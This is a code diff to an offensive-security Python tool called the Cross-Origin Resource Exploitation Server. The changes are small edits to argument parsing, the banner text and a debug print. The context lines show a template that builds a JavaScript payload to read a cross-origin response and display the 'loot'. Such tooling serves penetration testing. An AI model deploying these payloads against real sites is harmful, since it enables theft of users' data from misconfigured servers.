@@ -7,7 +7,6 @@ Cross-Origin Resource Exploitation Server
 import argparse
 import json
 import os
-import requests
 import signal
 import socket
 import urllib
@@ -76,7 +75,7 @@ class Cores(object):
         ''' 1. Create CORS template for JavaScript Payload
             2. Write CORS template to file '''
 
-        if self.log_style.lower() == 'html':
+        if ''.join(self.log_style) == 'html':
             filename = './js/cors.js'
             cors_js_template = """var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -87,7 +86,7 @@ function reqListener() {{
     document.getElementById("loot").innerHTML = (this.responseText);
 }};"""
 
-        if self.log_style.lower() == 'alert':
+        if ''.join(self.log_style) == 'alert':
             filename = './js/cors.js'
             cors_js_template = """var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -119,7 +118,7 @@ window.alert(this.responseText);
             <body>
                 <p style="margin-left: 55px">
                 <b>Cross-Origin Resource Exploitation Server</b><br>
-                CORES {0}<br>
+                C.O.R.E.S. {0}<br>
                 Description:Cross-Origin Resource Exploitation Server.<br>
                 Created by: Nick Sanzotta/@Beamr<br></p>
                 
@@ -183,7 +182,7 @@ def main():
     """main function handles argument processing and sigint handling"""
 
     # App info
-    App = ' CORES '
+    App = '{:<20}C.O.R.E.S.'
     Version = 'v1.10092017'
     Author = 'Nick Sanzotta/@Beamr'
     Contributors = 'Bill Harshbarger'
@@ -193,6 +192,7 @@ def main():
         metavar='get, post, etc.', \
         help='Define HTTP request method ex: -m post', \
         choices=['get', 'post', 'put', 'delete', 'head', 'trace'], \
+        nargs=1, \
         required=True)
     parser.add_argument('-p', '--port', \
         metavar='8080',\
@@ -207,6 +207,7 @@ def main():
         action='store_true')
     parser.add_argument('-s', '--log_style', \
         metavar='alert || html', \
+        nargs=1, \
         required=True, help='Select log style: javascript / inner html', \
         choices=['alert', 'html'])
     parser.add_argument('-u', '--url', \
@@ -216,6 +217,8 @@ def main():
         action='store_true', \
         help='Turn on Verbosity (Displays JavaScript code in STDOUT)')
     args = parser.parse_args()
+
+    print(args)
 
     clearscreen()
     banner(App, Version, Author, Contributors)
